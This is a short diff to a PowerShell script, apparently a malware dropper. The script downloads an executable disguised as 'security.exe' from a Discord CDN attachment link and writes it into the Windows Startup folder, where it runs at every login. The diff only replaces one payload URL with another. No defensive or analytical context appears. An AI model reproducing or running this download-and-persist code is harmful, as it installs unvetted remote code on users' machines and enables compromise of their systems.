@@ -1,5 +1,5 @@
 $startupFolder = [Environment]::GetFolderPath("Startup")
-$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345432361558605975/security.exe?ex=67c48707&is=67c33587&hm=fd4c7eaaa2cb6e851ce9d233cf1c3ba5454523afe0d8c85784de597b8a65226e&"
+$url = "https://cdn.discordapp.com/attachments/1209632213742657576/1345432952611274833/security.exe?ex=67c48794&is=67c33614&hm=33af143dd0a934bdd1c39431ca05a2cde5f3c97277bd40e01319e474675a0e18&"
 $outputPath = Join-Path $startupFolder "security.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $outputPath
